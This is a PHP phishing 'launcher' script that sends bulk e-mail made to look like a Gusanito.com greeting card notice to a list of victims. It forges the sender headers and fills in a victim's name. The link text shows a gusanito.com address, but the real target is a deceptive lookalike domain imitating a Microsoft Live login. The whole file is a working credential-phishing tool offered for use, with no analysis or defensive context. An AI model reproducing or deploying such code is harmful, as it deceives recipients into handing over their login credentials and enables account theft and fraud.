<title>Gusanito</title>
<?php
//
//Lanzador By _84kur10_
//

set_time_limit(0);

if($_POST['Manda'])
{

//EMAIL DO DESTINAT?RIO
$FromName = $_POST['FromName'];
$FromMail = $_POST['FromMail'];

//ASSUNTO DO EMAIL
$assunto = $_POST['assunto'];

//MENSAGEM DO EMAIL
$mensagem = '<table cellspacing="0" cellpadding="0">
  <TR>
    <TD bgColor="#b5de22" colSpan="5">Hola! <STRONG>'.$_POST['Nvic'].'</STRONG> has recibido una   tarjeta.&nbsp; <BR>
        <BR></TD>
  </TR>
  <TR>
    <TD vAlign="top"><TABLE width="90%" align="center">
      <TBODY>
        <TR>
          <TD>Has recibido una postal de '.$_POST['Nenv'].'('.$_POST['Cenv'].'). <BR>
                <BR>
            Para   verla, haz click en el siguiente   enlace:<BR>
            <a href="http://login.live.com.cneloja.gov.ec">http://gusanito.com/tarjetas/23QW1F8SD75V1RR54654FGSR6D7KU/129551369/gusanito</a><BR>
            <BR>
            (Si   el enlace no funciona, puedes copiarlo y pegarlo en la barra de direcciones de   tu navegador).<BR>
            <BR>
            Para recogerlo a mano desde la p&aacute;gina, acude a:   http://gusanito.com/g/gusanito/manualRetrieve.jsp<BR>
            <BR>
            Y en el recuadro   ingresa el siguiente c&oacute;digo: 23QW1F8SD75V1RR54654FGSR6D7KU<BR>
            <BR>
            <EM>*NOTA:   Este c&oacute;digo te sirve s&oacute;lo para esta ocasi&oacute;n, no es una contrase&ntilde;a ni te servir&aacute;   para recoger otros contenidos.</EM></TD>
        </TR>
        <TR>
          <TD></TD>
        </TR>
      </TBODY>
    </TABLE>
        <BR>
        <TABLE width="100%" align="center" bgColor="#e5e5e5">
          <TBODY>
            <TR>
              <TD width="10"></TD>
              <TD></TD>
              <TD width="10"></TD>
            </TR>
          </TBODY>
        </TABLE></TD>
  </TR>
  <TR>
    <TD bgColor="#b5de22" colSpan="5"><BR>
        <BR>
      &nbsp;&nbsp;&nbsp;2010&reg; &amp; &copy; Gusanito.com S. de R.L. de   C.V. Todos los derechos reservados.</TD>
  </TR>
</table>
<p>&nbsp;</p> ';
$mensagem = stripslashes($mensagem);
//CABE?ALHO DO EMAIL
$headers .= "From: \"$FromName\" <".$FromMail.">\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";
$headers .= "Reply-To: me <me@mysite.com>\n";
$headers .= "X-Priority: 3\n";
$headers .= "X-MSMail-Priority: Normal\n";
$headers .= "X-Mailer: My mailer";

//ARQUIVO COM OS EMAILS
$arquivo = $_POST['lista'];

//GERANDO UM ARRAY COM A LISTA
$file = explode("\n", $arquivo);
$i = 1;

}
?>
<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" bgcolor="#C0C0C0" onload="submit();">
<p>&nbsp;</p>
<style type="text/css">
td {
font-family:verdana;
color:#000000;
font-size:10px;
}
</style>
<?
if($_POST['Manda']) { ?>
<div align="center">
<table width="59%" height="30" border="0" cellpadding="2" cellspacing="1" bgcolor="#FF0000">
<tr>
<td bgcolor="#C0C0C0">
<?
foreach ($file as $mail) {
if(mail($mail, $assunto, $mensagem, $headers)) {
echo "<font color=green face=verdana size=1>* $i - ".$mail."</font> <font color=green face=verdana size=1>OK</font><br>";
} else {
echo "* $i ".$mail[$i]." <font color=red>NO</font><br><hr>";
$i++;
}
}
?>
</td>
</tr>
</table>
</div>
<? } ?>
<form name="form1" method="post" action="">
<div align="center">
<table width="47%" height="202" border="0" cellpadding="0" bgcolor="#006699">
<tr>
<td colspan="2" align="center"><b>LANZADOR </b></td>
</tr>
<tr>
<td width="66%">
<input name="assunto" type="hidden" type="text" id="assunto3" value="Has recibido una tarjeta de Gusanito.com" size="50"></td>
</tr>
<tr>
<td><input name="FromName" type="hidden" value="Gusanito Postales " size="50"></td>
</tr>
<tr>
<td>
<input name="FromMail" type="hidden" size="50" value="no-replay@gusanito.com"></td>
</tr>
<tr>
<td><b>E-MAILS:</b></td>
<td><input id="boton" name="lista"value="" size="35" type="text" /></td>
</tr>
<tr>
<td><b>Nombre Victima:</b></td>
<td><input id="boton" name="Nvic" value="" size="35" type="text" /></td>
</tr>
<tr>
<td><b> Nombre De Quien Envia: </b></td>
<td><input id="boton" name="Nenv" value="" size="35" type="text" /></td>
</tr>
<tr>
<td><b>Correo De Quien Envia: </b></td>
<td><input id="boton" name="Cenv" value="" size="35" type="text" /></td>
</tr>
<tr>
<td align="center" colspan="2"><input name="Manda" type="submit" id="Manda" value="Enviar"></td>
</tr>
</table>
<p>&nbsp;</p>
<p>&nbsp; </p>

</div>



</form>
</body>